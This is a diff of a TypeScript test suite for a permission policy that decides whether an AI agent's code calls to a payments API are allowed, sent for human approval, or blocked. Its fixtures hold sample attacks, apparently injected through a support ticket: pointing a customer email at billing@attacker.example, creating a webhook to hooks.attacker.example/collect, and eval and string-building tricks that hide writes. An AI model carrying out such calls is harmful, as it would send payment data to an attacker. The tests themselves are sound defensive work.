@@ -60,6 +60,8 @@ function setup() {
   return { readTicket, decide };
 }
 
+const run = (body: string) => `async function run(client) {\n${body}\n}`;
+
 const execute = (code: string): CallInput => ({
   serverId: 'dodopayments-mcp',
   tool: 'execute',
@@ -67,17 +69,59 @@ const execute = (code: string): CallInput => ({
 });
 
 describe('dodo-payments template', () => {
-  it('asks before read-only code too: code text cannot prove it is read-only', () => {
+  it('asks exactly when the allow rule does not match: the two conditions are equal', () => {
+    const doc = parsePolicyYaml(readFileSync(TEMPLATE, 'utf8')).doc;
+    const allow = doc.rules.find((r) => r.id === 'allow-proven-dodo-read');
+    const ask = doc.rules.find((r) => r.id === 'ask-dodo-execute');
+    expect(allow?.when).toBeDefined();
+    expect(ask?.when).toEqual({ not: allow?.when });
+    expect(allow?.match).toEqual(ask?.match);
+  });
+
+  it('runs a proven read without asking (template v3)', () => {
     const c = setup();
     c.readTicket();
-    const list = c.decide(execute('return await client.payments.list({ page_size: 10 });'));
-    expect(list.verdict).toBe('ask');
-    expect(list.matchedRules.map((r) => r.ruleId)).toEqual(['ask-dodo-execute']);
+    for (const code of [
+      run('return await client.payments.list({ page_size: 10 });'),
+      run("const p = await client.payments.retrieve('pay_9fXk2');\nreturn p;"),
+      run(
+        "const a = await client.refunds.list({ payment_id: 'pay_9fXk2' });\nconst b = await client.customers.retrieve('cus_77');\nreturn { a, b };",
+      ),
+    ]) {
+      const d = c.decide(execute(code));
+      expect(d.verdict, code).toBe('allow');
+      expect(d.matchedRules.map((r) => r.ruleId)).toEqual(['allow-proven-dodo-read']);
+      expect(d.reason).toContain('checked by parsing it');
+    }
+  });
+
+  it('asks before a read that uses a value from untrusted content', () => {
+    const c = setup();
+    c.readTicket();
     // Looking a customer up by the address in the ticket is normal support work: a person checks it.
-    const lookup = execute(
-      "return await client.customers.list({ email: 'billing@attacker.example' });",
+    const lookup = c.decide(
+      execute(run("return await client.customers.list({ email: 'billing@attacker.example' });")),
     );
-    expect(c.decide(lookup).verdict).toBe('ask');
+    expect(lookup.verdict).toBe('ask');
+    expect(lookup.matchedRules.map((r) => r.ruleId)).toEqual(['ask-dodo-execute']);
+  });
+
+  it('asks before read-looking code that is not the proven shape', () => {
+    const c = setup();
+    for (const code of [
+      // No run function: the server rejects it, and the check does not try to guess.
+      'return await client.payments.list({ page_size: 10 });',
+      run('const c = client;\nreturn c.payments.list();'),
+      run("return client['payments'].list();"),
+      run("return client.payments.retrieve('pay_1', { method: 'post', path: '/refunds' });"),
+      run('return client.payments?.list();'),
+      run('return client.\\u0070ayments.list();'),
+      run('for (const n of [1]) await client.payments.list();\nreturn null;'),
+      run('return client.webhooks.list();'),
+      run('return client.payments.list(;'),
+    ]) {
+      expect(c.decide(execute(code)).verdict, code).toBe('ask');
+    }
   });
 
   it('never allows a write disguised as a read (audit H1)', () => {
@@ -90,6 +134,7 @@ describe('dodo-payments template', () => {
       "return await client.payments.list({}).then(() => client.refunds\n.create({ payment_id: 'pay_1' }));",
     ]) {
       expect(c.decide(execute(code)).verdict, code).not.toBe('allow');
+      expect(c.decide(execute(run(code))).verdict, code).not.toBe('allow');
     }
   });
 
@@ -102,9 +147,10 @@ describe('dodo-payments template', () => {
       // Reads plus a write in the same code: still a write.
       "const p = await client.payments.retrieve('pay_9fXk2'); return client.refunds.create({ payment_id: p.payment_id });",
     ]) {
-      const d = c.decide(execute(code));
-      expect(d.verdict, code).toBe('ask');
-      expect(d.matchedRules.map((r) => r.ruleId)).toEqual(['ask-dodo-execute']);
+      for (const d of [c.decide(execute(code)), c.decide(execute(run(code)))]) {
+        expect(d.verdict, code).toBe('ask');
+        expect(d.matchedRules.map((r) => r.ruleId)).toEqual(['ask-dodo-execute']);
+      }
     }
   });
 
@@ -115,10 +161,13 @@ describe('dodo-payments template', () => {
       "const m = 'cre' + 'ate'; return client.refunds[m]({ payment_id: 'pay_9fXk2' });",
       'return eval(\'client.refunds.create({ payment_id: "pay_9fXk2" })\');',
       "return fetch('https://example.com');",
-      'return 42;',
     ]) {
       expect(c.decide(execute(code)).verdict, code).toBe('ask');
+      expect(c.decide(execute(run(code))).verdict, code).toBe('ask');
     }
+    // Bare code is not a run function: ask. A run function without any client call is harmless.
+    expect(c.decide(execute('return 42;')).verdict).toBe('ask');
+    expect(c.decide(execute(run('return 42;'))).verdict).toBe('allow');
   });
 
   it('blocks changes that use an email or URL copied from the ticket', () => {
@@ -139,6 +188,15 @@ describe('dodo-payments template', () => {
       ),
     );
     expect(exfil.verdict).toBe('block');
+    // The same inside a run function, and hidden behind a read.
+    for (const code of [
+      run("return await client.customers.update('cus_77', { email: 'billing@attacker.example' });"),
+      run(
+        "await client.payments.list();\nreturn client.webhooks.create({ url: 'https://hooks.attacker.example/collect' });",
+      ),
+    ]) {
+      expect(c.decide(execute(code)).verdict, code).toBe('block');
+    }
   });
 
   it('only asks for the same change when the value did not come from untrusted content', () => {
